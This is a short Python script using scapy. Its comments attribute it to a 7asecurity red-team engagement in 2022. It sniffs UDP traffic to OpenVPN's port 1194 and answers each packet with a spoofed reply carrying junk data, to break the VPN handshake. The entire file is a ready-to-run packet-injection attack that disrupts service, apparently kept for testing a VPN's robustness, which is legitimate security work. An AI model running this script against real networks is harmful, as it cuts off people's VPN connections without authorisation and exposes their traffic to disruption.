#!/usr/bin/env python3
import argparse
import os

from scapy.all import *

# Inject bogus packets to interfere with OpenVPN handshake.
# This script was provided by 7asecurity.com during their Red Team engagement
# in August/September 2022.

INTERVAL = 1.0

def sniff_callback(packet):
    l3 = IP(src=packet.getlayer(IP).dst, dst=packet.getlayer(IP).src)
    l4 = UDP(dport=packet.getlayer(UDP).sport, sport=packet.getlayer(UDP).dport)
    l5 = b"BADPACKET"
    packet = l3 / l4 / l5
    send(packet)
    time.sleep(INTERVAL)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", default="eth0", help="Interface to listen on")
    parser.add_argument("-t", "--time", default=INTERVAL, help="Time to wait between injections (seconds)")
    args = parser.parse_args()

    INTERVAL = float(args.time)

    print("[+] Intercepting requests to UDP port 1194 and injecting bogus response")
    print("[-] Interval:", args.time, "seconds")
    sniff(iface=args.interface, prn=sniff_callback, filter="udp and dst port 1194", store=0)
